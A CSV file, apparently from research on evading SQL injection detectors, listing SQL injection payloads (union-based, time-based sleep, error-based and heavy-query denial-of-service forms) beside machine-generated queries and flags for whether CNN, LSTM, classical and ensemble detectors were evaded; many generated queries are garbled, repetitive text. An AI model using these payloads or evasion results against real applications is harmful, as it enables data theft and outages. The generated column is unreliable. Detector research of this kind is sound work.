,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
8961,"-9684"" order by 1#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
8962,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",SELECT * FROM benchmark WHERE NOT md5 ( 0x4c4d6142 ) = 'valid',1,1,0,0,1,0,0
8963,-1579%'   )    )     )   union all select 7272#,SELECT 7272# FROM SQL injection detection,1,0,1,1,1,1,1
8964,1' in boolean mode  )   and 9198  =  9198--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
8965,"1""  )   as piwi where 2918  =  2918",SELECT MIN(2918 = 2918) FROM SQL injection detection,1,1,1,1,1,1,1
8966,"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,SELECT DISTINCT elt ( 4249 = 4249 = 4249 = 4249 = 7259 ) AND (((((((((((((((((((((((((((((((((()) FROM SQL injection),0,1,0,0,0,0,0
8967,"-8869"" where 3019  =  3019 union all select 3019,3019,3019#","SELECT MIN(3019 = 3019 = 3019 WHERE NOT -8869 = ""SQL injection detection""",1,1,0,0,0,0,0
8968,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,"SELECT 6793 FROM pg_sleep WHERE ""SQL injection"" = ""SQL injection"" ORDER BY 6753 = 4653",1,1,1,0,0,0,0
8969,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",SELECT MIN(2256 - 4876) FROM SQL injection detection,1,1,1,1,1,1,1
8970,"1%""   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""%""  =  """,SELECT MIN(SQL) FROM SQL injection detection),1,0,1,1,1,1,1
8971,"1 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT NOT SQL_key FROM SQL ORDER BY _valid_inject LIMIT 1,1,1,1,1,1,1,1
8972,"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '","SELECT MIN(%) FROM SQL injection detection) FROM SQL SELECT elt ( 4483 = 5364,5364 ) AND (((%) = '%') = 'elt'",1,1,0,0,0,0,0
8973,"-7271'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'mdtw'  =  'mdtw","SELECT MIN(sql injection) FROM SQL_injection' ORDER BY 9354 = 9354,7185",0,1,1,1,0,1,0
8974,1   )    )    as efjb where 4642  =  4642 order by 1#,SELECT AS ____ FROM efjb WHERE 4642 = 4642 ORDER BY 1#,1,1,1,1,0,1,0
8975,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",SELECT'sql injection detection' FROM SQL_injection',0,1,1,1,1,1,1
8976,1'  )   where 2840  =  2840,SELECT MIN(2840 = 2840) FROM SQL injection detection,1,1,0,1,1,1,0
8977,1'||  (  select 'yyil' from dual where 3121  =  3121,SELECT 'yyil' FROM SQL injection detection',1,0,1,1,1,1,1
8978,"1   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5137  =  5137",SELECT MIN(5137 = 5137) FROM SQL injection,1,1,0,0,1,0,0
8979,"1%""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection - SELECT MIN(sql) FROM SQL,1,1,1,1,1,1,1
8980,"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""kvpy""  =  ""kvpy","SELECT MIN(succes_injection) FROM SQL_injection, SELECT MIN(success_injection) FROM SQL_injection) AND NOT (suelt (suelt) + 1",1,1,1,0,1,1,0
8981,"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM Query: -4932%) ORDER BY MIN(SQL),1,1,0,0,1,0,0
8982,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nelb'  =  'nelb",SELECT MIN(sql) FROM SQL injection detection) FROM SQL SELECT MIN(sql) FROM query: 1' ORDER BY MIN(sql),1,1,1,0,1,1,0
8983,1'||  (  select 'vdeo' where 4355  =  4355,SELECT SELECT 'vdeo' FROM SQL injection detection',1,0,1,1,1,1,1
8984,1' in boolean mode  )   and 3787  =  7750--,SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM query: 1' AND 3787 = 7750 - SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM query: 1',1,1,1,0,1,1,0
8985,"-2790%""  )   union all select 5070,5070#","SELECT MIN(5070,5070#) FROM SQL injection detection",1,1,1,1,1,1,1
8986,1'||  (  select 'vpuh' where 8164  =  8164,SELECT 'vpuh' FROM SQL injection detection',1,0,1,1,1,1,1
8987,-5062  )   where 7457  =  7457 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM 7457 = 7457 OR 4144 = 7457 ORDER BY 113,0,1,1,1,0,1,0
8988,1'  )   and 2564  =  3234--,SELECT MIN(SQL injection) FROM SQL_injection WHERE NOT Query: 1' INTERSECT SELECT MIN(SQL injection) FROM SQL_injection),1,1,1,0,1,1,0
8989,"1""  )   as firv where 4522  =  4522 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT MIN(*) FROM SQL injection detection WHERE NOT firv = 4522 = 4522 OR STRB$Collations = t3,rdb$functions as t4 JOIN rdb$fields AS t4 ON t2.rdb$collations = t3.rdb$functions as t4 JOIN SQL injection detection AS t4 ON t2.rdb$collations = t3,rdb$functions = '2367 = 4522 = 4522 = 4522 = 4522 OR NOT STRFTIME('%y-%m-%d', '%s-%d', '%s-%d', '%s-%d', '%SQ%'",1,1,0,0,0,0,0
8990,1'||  (  select 'lkmh' where 7659  =  7659,SELECT lkmh FROM SQL injection_detection,1,0,1,1,1,1,1
8991,"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --","SELECT MIN(sleep ( 5 ) FROM SQL injection detection) FROM SQL SELECT MIN(3476 = 3476) FROM SQL SELECT SELECT elt ( 1210 = 1210,sleep ( 5 ) FROM SQL injection detection)",1,1,0,0,1,0,0
8992,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx","SELECT dbms_pipe.receive_message, COUNT(*) FROM dbms_pipe.receive_message WHERE NOT chr ( (SELECT dbms_pipe.receive_message) FROM dbms_pipe.receive_message) FROM dbms_pipe.receive_message = 'valid')",1,1,0,0,1,0,0
8993,1'   )    )    as kgfp where 2366  =  2366,SELECT MIN(2366 = 2366) FROM SQL injection detection,1,1,0,0,1,0,0
8994,"-3952'  )   union all select 6644,6644,6644--","SELECT 6644,6644-- FROM SQL SELECT 6644,6644-- FROM SQL SELECT MIN(SQL) FROM SELECT 6644,6644-- FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT 6644,6644-- FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL -3952' ) FROM SELECT MIN(sql injection) FROM SQL SELECT MIN(SQL_6952' ) FROM SELECT MIN(SQL_DATETIME(SQL) FROM SQL SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(SQL) FROM SELECT MIN(",1,1,1,0,1,1,0
8995,"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah","SELECT MIN(*) FROM SQL injection detection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4 & (SELECT MIN(*) FROM SQL injection)'",1,1,0,0,0,0,0
8996,"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'lokx' like 'lokx",SELECT DISTINCT'sql injection' FROM SQL_injection',0,0,1,1,1,1,1
8997,-2679'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cutk' like 'cutk,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection - 4747 = dbms_utility.sqlid_to_sqlhash ((sqlid_to_sqlhash) or 4747 = 4747 = dbms_utility.sqlid_to_sqlhash) ORDER BY 113,0,1,0,0,0,0,0
8998,"-5845'   )    )     )   union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL) -5845' ),1,0,1,0,1,1,0
8999,"-5857%""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,SELECT MIN(5023 ='sq injection') FROM SQL injection,1,1,1,0,1,1,0
9000,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",SELECT MIN(fvrq) FROM SQL injection detection,1,1,1,1,1,1,1
9001,"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql) FROM SELECT MIN(sql)||chr ( 112 ) = 0,1,1,0,0,1,0,0
9002,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) AS clhk WHERE 4607 = 4607 OR (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT_sq_diagnosis) FROM SQL_injection) FROM (SELECT SUM((SELECT SUM(insert_schema.character_sets) FROM (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN",0,1,0,0,1,0,0
9003,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   +'",SELECT MIN(3702) +' FROM SQL injection_detection,0,1,0,1,1,1,0
9004,-3304'   )    )    order by 1--,SELECT MIN(1 AS __304') FROM SQL injection_description,1,1,1,0,1,1,0
9005,"1  )   as jvuo where 6859  =  6859 union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM jvuo WHERE 6859 = 6859,1,1,1,1,1,1,1
9006,1  )   where 5651  =  5651,SELECT * FROM query: 1 JOIN SQL injection query: 1 WHERE 5651 = 5651 = 5651 AND NOT SQL_Injection IS NULL,0,1,1,1,0,1,0
9007,"1%"" or sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
9008,1   )    )    as ctqr where 2609  =  2609,"SELECT NOT AS _ctqr FROM Query: 1 ) AS _ctqr WHERE 2609 = 2609 AND NOT SQL_Injection = ""valid""",1,1,1,0,0,0,0
9009,1  )   where 4866  =  4866,SELECT * FROM query: 1 JOIN SQL injection query: 1 JOIN 4866 = 4866,0,1,1,1,1,1,1
9010,"1'+  (  select 'zxxh' where 4065  =  4065 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE ""SQL = 4065 = 4065 AND 8635 = (SELECT MIN(1,5000000) FROM generate_series)",0,1,0,0,0,0,0
9011,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""svse""  =  ""svse",SELECT MIN(svse) FROM SQL injection detection) FROM SQL injection,1,0,0,1,1,1,0
9012,"1'  )   where 5276  =  5276 union all select null,null--",SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
9013,1   )    )     )   or sleep  (  5  )   and    (    (     (  2209  =  2209,"SELECT ((2209 = 2209) FROM SQL AS _injector_search query, MIN(2209 = 2209) FROM query: 1 ORDER BY SQL_inject_required_required_required_required_required_required_required)",1,1,1,0,1,1,0
9014,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000000/2 ) FROM SQL injections WHERE 5907 = 5907 OR 6979 = like (SELECT MIN(500000000000/2 ) FROM SQL SELECT MIN(500000000000/2 ) FROM zxho WHERE 5907 = 5907 OR 6979 = like (SELECT MIN(500000000000/2 ) FROM SQL SELECT MIN(500000000000/2 ) FROM SELECT * FROM SELECT * FROM zxho) FROM SELECT SELECT MIN(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000) FROM 6979 = like (SELECT MIN(500000000000000000000000000000000000/2 ) FROM zxho) FROM zxho),1,1,0,0,1,0,0
9015,"1%""  )   or sleep  (  5  )  #",SELECT MIN(5 - 1) FROM SQL injection detection,1,1,1,1,1,1,1
9016,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",SELECT MIN(4249 = 4249 OFFSET 7259) FROM SQL injections WHERE 8348 = 8348 AND elt = 8348 AND NOT elt = 4249 = 4249 = 7259,1,1,0,0,0,0,0
9017,1 waitfor delay '0:0:5'--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
9018,"1'||  (  select 'aair' where 9234  =  9234 union all select null,null,null,null#",SELECT 'aair' FROM SQL injection',1,0,1,1,1,1,1
9019,"-4165"" where 1772  =  1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",SELECT MIN(sql injection) FROM SQL_Injection WHERE 1772 = 1772,1,1,1,1,0,1,0
9020,"1%""  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
9021,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#","SELECT MIN(SQL) FROM 2446 WHERE NOT 2446,2446,2446,2446,2446,2446# = ""SQ injection detection""",1,1,0,0,0,0,0
9022,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",SELECT MIN(success injection) FROM SQL_Injections WHERE NOT 0x7171706a71 = '%' AND '%' = '%',1,1,0,0,0,0,0
9023,"1%"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""%""  =  """,SELECT MIN(excat) FROM SQL injection - SELECT MIN(excat) FROM SELECT MIN(excat) FROM SQL SELECT MIN(excat) FROM Query: 1%),1,1,0,0,1,0,0
9024,"-8109%""   )    )    union all select 9089,9089--","SELECT 9089,9089-- FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 9089,9089--",1,1,1,1,1,1,1
9025,1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,1,1,1,1,1,1
9026,"1'+  (  select pxrg where 5589  =  5589 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE 5589 = 5589 OR 5589 = 5589 ORDER BY sysusers as sys4,sysusers as sys4,sysusers as sys7",1,1,0,1,0,0,0
9027,1'||  (  select 'uebk' from dual where 6990  =  6990,SELECT 'uebk' FROM SQL injection detection',1,0,1,1,1,1,1
9028,"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh","SELECT MIN(SQL injection) FROM SQL SELECT MIN(SQL injection) FROM query: 1 WHERE NOT iqlh = ""iqlh"" AND NOT iqlh = ""iqlh""",1,1,1,0,1,1,0
9029,"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#","SELECT MIN(6462,6462,6462,6462,6462# FROM SQL injection_engineer WHERE NOT SELECT MIN(6462 = 6462 union All select 6462,6462,6462,6462,6462,6462# FROM SQL injection_engineer WHERE NOT SELECT MIN(6462 = 6462) FROM Query: -9007 ) as gill WHERE 6462 = 6462",1,1,0,0,0,0,0
9030,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",SELECT DISTINCT uhiy FROM SQL injection detection,1,0,1,1,1,1,1
9031,1%' and 7366  =  9197#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
9032,"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--","SELECT MIN(6166,6166,6166--) FROM SQL injection AS t1 JOIN 6166 = 6166 WHERE t1.sequence ='sq injection'",0,1,0,0,0,0,0
9033,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",SELECT MIN(7989 = 7989) FROM SQL AS t1 JOIN (SELECT 8882 FROM 8882 = 1593 OFFSET 1593) AND NOT t1.7989 = 7989,0,1,1,0,1,1,0
9034,1'  )   and   (  3020  =  3020  )  *6703,SELECT MIN(3020 = 3020) FROM SQL injection detection,1,1,0,1,1,1,0
9035,else dbms_lock.sleep  (  0  ) ,SELECT 0 FROM SQL AS _valid_sq_injector WHERE NOT dbms_lock.sleep (0 ),1,1,1,1,1,1,1
9036,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL_injection) FROM qrok WHERE 8257 = 8257 OR 8421 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,1,0,0
9037,"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",SELECT MIN(sqr) FROM SQL injection detection WHERE 7226 = 7226 AND NOT gcrr  (SELECT * FROM (SELECT * FROM (SELECT SUM(swift) FROM SQL)),1,1,0,0,1,0,0
9038,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""wdbg"" like ""wdbg","SELECT COUNT(*) FROM generate_series WHERE NOT SQL_injection = ""valid"" AND NOT ( ( (SELECT * FROM generate_series) AND (SELECT * FROM generate_series WHERE NOT (wdbg) = 'wdbg')",1,1,0,0,0,0,0
9039,-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,SELECT MIN(sql) FROM Query: -2658 - as casi WHERE NOT 7364 = 7364 OR 8245 = 9651--,1,1,1,1,0,1,0
9040,"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""tzqk"" like ""tzqk","SELECT tzqk FROM SQL injections EXCEPT SELECT tzqk, COUNT(*) FROM SQL_Injections GROUP BY tzqk",1,1,1,1,1,1,1
9041,-7984' order by 1--,SELECT MIN(1 - 7984') FROM SQL injection detection,0,1,0,0,1,0,0
9042,"1"" where 6352  =  6352",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1 WHERE NOT 6352 = 6352,1,1,1,1,1,1,1
9043,"1%'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql ) FROM SQL injection detection,1,0,1,1,1,1,1
9044,"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql -4695' ) -4695',1,1,1,0,1,1,0
9045,-8028%'   )    )     )   or 5042  =  5214,SELECT MIN(SQL) FROM SQL Injection WHERE NOT -0028%' ) = 5042 = 5214,1,1,0,0,0,0,0
9046,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#","SELECT 8885,8885,8885,8885,8885,8885,8885# FROM SQL SELECT MIN(SQL injection) FROM SELECT MIN(SQL injection) FROM SELECT MIN(SQL injection) FROM 8885,8885,8885,8885,8885,8885,8885## FROM SQL JOIN 8885,8885## WHERE NOT 8885,8885,8885,8885,8885,8885,8885,8885,8885# ='sq injection'",1,1,1,0,0,0,0
9047,"1"" union all select null#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
9048,1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,SELECT'sql injection detection' FROM SQL SELECT SELECT 'bifa' FROM SQL SELECT MIN(6077 = 6077) FROM SQL SELECT SELECT 'bifa' FROM SQL SELECT SELECT SELECT 'bifa' FROM SQL SELECT SELECT MIN(6077 = 6077) FROM SELECT SELECT SELECT 'bifa' FROM SQL SELECT MIN(6077 = 6077 = 6077' AND 4547 = 9301,1,1,0,0,1,0,0
9049,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",SELECT MIN(sqlx) FROM SQL injection - SELECT MIN(sqlx) FROM SQL - SELECT MIN(sqlx) FROM xzlx GROUP BY xzlx,1,1,1,1,1,1,1
9050,1   )    )    as ojjk where 3687  =  3687 and   (  4833  =  9218  )  *9218--,SELECT *9218-- for FROM SQL AS ojjk WHERE 3687 = 3687 AND NOT ojjk = 3687 AND 4833 = 9218,1,1,0,1,0,0,0
9051,"-7236 or make_set  (  9618  =  6919,6919  )  ","SELECT 9618 = 6919,6919 AND NOT SQL_Inject ='sq injection'",0,1,1,1,0,1,0
9052,"1""  )   as htyo where 8322  =  8322 and 4595  =  4595#",SELECT MIN(sql injection) FROM SQL injection detection WHERE 8322 = 8322 AND 4595 = 4595#,1,1,1,1,0,1,0
9053,1  )   where 9552  =  9552 and 1961  =  6333--,"SELECT * FROM query: 1 JOIN SQL injection query: 1 WHERE 9552 = 9552 AND 1961 = 6333-- for = ""valid""",0,1,1,0,0,0,0
9054,"select pg_sleep  (  5  )   and    (    (   ""byhx"" like ""byhx",SELECT NOT (SELECT SUM(((((((((((()) FROM pg_sleep) FROM Query: pg_sleep ( 5 ) AND NOT ( (SELECT SUM(((((((((((((((((((((((((()) FROM pg_sleep) FROM Query: pg_sleep) FROM Query: SELECT SUM((SELECT SUM((((((((((((((((((((((((((((((((((((((((((((((() FROM pg_sleep) FROM pg_sleep) FROM pg_sleep) FROM pg_sleep) FROM SELECT SUM(((((((((((((((((((((((((((((((((()) FROM p,1,1,0,0,1,0,0
9055,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",SELECT MIN(*) FROM SQL injection detection WHERE 5606 = 5606 AND all_users = 9660 = (SELECT SUM(*) FROM SQL),1,1,0,0,0,0,0
9056,"1%'   )    )    union all select null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
